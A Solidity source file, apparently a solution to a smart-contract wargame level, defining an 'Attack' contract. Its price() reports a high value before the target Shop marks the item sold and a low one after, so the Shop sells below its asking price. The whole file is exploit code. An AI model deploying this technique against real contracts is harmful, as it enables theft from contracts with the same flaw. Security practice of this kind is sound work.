pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    Shop shop = Shop(0xc6f46EDF46Aeb466296BE51600CB0a908121D1D7);

    function buy() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 100;
        } else {
            return 1;
        }
    }
}
